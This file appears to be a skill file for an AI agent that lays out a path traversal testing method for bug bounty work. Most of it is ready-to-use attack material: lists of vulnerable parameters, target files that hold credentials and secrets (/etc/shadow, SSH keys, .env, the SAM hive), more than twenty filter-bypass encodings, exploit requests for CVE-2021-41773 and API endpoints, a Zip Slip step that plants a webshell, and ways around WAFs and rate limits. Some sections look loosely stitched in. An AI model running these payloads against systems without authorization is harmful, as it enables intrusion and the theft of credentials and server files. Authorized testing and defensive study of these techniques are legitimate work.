---

name: web-24-path-traversal
sequence: web-24
category: access-control
domain: web
description: "Path traversal testing skill for offensive security and bug bounty. Covers basic ../ traversal, encoding bypasses (URL, double, overlong UTF-8), OS-specific paths, null byte injection, API path segment injection, and Zip Slip archive attacks. Use when testing file access controls."
wordlist_ref: "wordlists/web/web-49-path-traversal/"
---

# Path Traversal — Offensive Testing Methodology

## Quick Workflow

1. Identify attack surface and entry points specific to this vulnerability class
2. Run detection probes to confirm vulnerability presence
3. Escalate with bypass techniques if initial probes are blocked
4. Confirm exploitation and assess impact
5. Document findings with proof of concept and suggest remediation

---

## Purpose
Test for path traversal vulnerabilities in file-serving endpoints, download functions, and log viewers — enabling access to sensitive server files via `../` sequences and encoding bypasses. Distinct from LFI via file inclusion (web-08).

## OWASP Mapping
- A01:2021 Broken Access Control
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-23: Relative Path Traversal
- CWE-24: Path Traversal: '../filedir'

## Vulnerability Classes

### 1. Basic Path Traversal (../../../)
**Common vulnerable parameter names:**
```
?file=, ?path=, ?filename=, ?download=, ?document=
?report=, ?template=, ?theme=, ?lang=, ?resource=
?page=, ?view=, ?include=, ?content=, ?read=
?attachment=, ?export=
```

**Target files (Linux):**
```
/etc/passwd
/etc/shadow  (if running as root)
/etc/hosts
/proc/self/environ   (environment variables with secrets)
/proc/self/cmdline   (command line arguments)
/proc/net/tcp        (network connections)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
~/.bash_history, ~/.ssh/id_rsa
/home/www/.env
/var/www/html/.env
/var/www/html/config.php
/app/config/database.yml
```

**Target files (Windows):**
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM  (registry hive)
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

### 2. Path Traversal Encoding Bypasses
**Minimum 25 traversal encoding variants:**
```
../                   Basic traversal
..\                   Windows separator
..\/                  Mixed separators
%2e%2e%2f             URL-encoded ../
%2e%2e/               Partial encoding
..%2f                 Partial encoding
%2e%2e%5c             URL-encoded ..\
%252e%252e%252f       Double-encoded ../
..%252f               Double-encoded /
%c0%ae%c0%ae%c0%af    UTF-8 overlong encoding of ../
%c1%9c                Overlong encoding (IIS)
....//                Bypasses single dot removal
..;/                  Semicolon bypass (Tomcat)
/..%3b/               Semicolon + encoding (Tomcat)
%2e%2e%2f%2e%2e%2f    Double traverse encoded
..%c0%af              Overlong slash
..%c1%9c              Alternate overlong
%uff0e%uff0e%u2215    Unicode fullwidth
%uff0e%uff0e%u2216    Alternative fullwidth
....\/....\/          Repeated pattern
..././                Web filter bypass (replaces ../ with empty)
```

### 3. OS-Specific Path Injection
**Windows-specific:**
```
..\..\..\windows\win.ini
C:\windows\win.ini    (absolute path injection)
\\server\share\file   (UNC path traversal)
/windows/win.ini      (Unix-style path on Windows)
```

**Null byte injection (PHP < 5.3):**
```
../../etc/passwd%00.jpg
../../etc/passwd\x00.jpg
```

**Zip slip (archive extraction):**
- Upload zip containing `../../etc/passwd` as filename
- Server extracts → file placed outside intended directory

### 4. Encoded Path Separator Bypass
**Path separator variations:**
```
%2f, %5c, %2F, %5C        URL-encoded / and \
%252f, %255c               Double-encoded
%c0%af                     Overlong UTF-8 /
%c1%9c                     Overlong UTF-8 \
\x2f, \x5c                 Hex encoded
\u002f, \u005c             Unicode escape
```

### 5. Absolute Path Injection
**When filter strips `../`:**
- Try absolute path: `?file=/etc/passwd`
- Windows absolute: `?file=C:/windows/win.ini`
- If base path is /var/www/ → /etc/passwd traverses out

### 6. Path Truncation
**PHP path truncation (historical):**
- PHP < 5.3: null byte truncates filename
- `?file=../../etc/passwd%00.jpg` → null byte drops `.jpg`

**Long filename truncation (Windows NTFS):**
- Very long path → OS truncates → accesses different file

### 7. API Path Segment Injection
**REST path traversal:**
```
GET /api/v1/files/../../../etc/passwd
GET /api/download/../../config.php
GET /api/v1/users/%2e%2e%2f%2e%2e%2fconfig
```

**Spring Boot path traversal:**
```
GET /api/v1/files/..%2F..%2Fetc%2Fpasswd
```

### 8. Archive/ZIP Traversal (Zip Slip)
**Pattern:**
- Application extracts uploaded ZIP
- ZIP contains file named `../../shell.php`
- Extraction writes file outside intended directory

**Detection:** Upload specially crafted ZIP and check if file appears in traversed location

---

# ffuf for traversal fuzzing
# Alert: "Path Traversal", "Remote File Inclusion"
## Attack Surface (Parameter Matrix)

| Surface | Path Traversal Tests |
|---------|---------------------|
| file=, path=, filename= params | All 25+ encoding variants |
| URL path segments | /api/files/{traversal}/etc/passwd |
| POST body file paths | {path: "../../etc/passwd"} |
| Archive filenames | Zip slip attack |
| Content-Disposition header | If reflected in download |
| Cookie with file path | If path stored in cookie |
| Multipart filename | Upload with traversal filename |
| HTTP headers with paths | Referer, X-File-Path |

---

## HackerOne Report Patterns

**Pattern 1: Apache 2.4.49 path traversal (CVE-2021-41773 — H1 critical)**
`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` → Apache 2.4.49 normalizes encoded dots incorrectly → reads `/etc/passwd`.

**Pattern 2: Download endpoint traversal (H1 common)**
`?filename=../../config.php` → server reads PHP source instead of executing → hardcoded DB credentials exposed.

**Pattern 3: Zip Slip in file upload (H1 multiple)**
Upload ZIP with entry `../../var/www/html/shell.php` → server extracts to web root → webshell.

**Pattern 4: API path segment traversal (H1 #852065 type)**
`GET /api/v1/download/../../../etc/passwd` → Spring MVC path normalization issue → file read.

**Pattern 5: Double encoding bypass WAF (H1 common)**
WAF blocks `../` but not `%252e%252e%252f`. Double-encoded traversal reaches filesystem.

---

## Zero-Day Research Hooks

### Novel Traversal Vectors
- NTFS alternate data streams: `C:\config.php::$DATA` → bypass .php execution → read source
- Symlink traversal: create symlink within allowed directory pointing outside → traverse via symlink
- Virtual filesystem traversal: containerized apps with overlayfs → path traversal across overlay layers
- URL normalization quirks: nginx vs Apache vs Tomcat normalize paths differently → exploit discrepancy
- CGI path info traversal: `/cgi-bin/script.cgi/../../etc/passwd` → PATH_INFO traversal

---

## False Positive Mitigation
- File content: confirm actual sensitive file content (not random text containing /etc/passwd string)
- Error messages: distinguish 404 "file not found" from path validation error
- Encoding: confirm specific encoding worked (test multiple depths and encodings)
- Windows: use win.ini or hosts as confirmation target (not SAM which is locked)

---




## Hacker Mindset

**Path traversal is a parser differential.** The application reads your path after normalization. Your goal is to send a path that bypasses the application's filter but normalizes to `../` on the filesystem.

**25 encoding variants is the minimum.** URL encode, double encode, UTF-8 overlong, Unicode fullwidth, 16-bit Unicode — each encoding bypasses different filters.

**Windows vs Unix differences matter.** `/etc/passwd` and `C:\Windows\win.ini` need different traversal patterns.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates
- ffuf (for path fuzzing)


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-49-path-traversal/`

**Files**:
- `wordlists/web/web-49-path-traversal/payloads/lfi/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

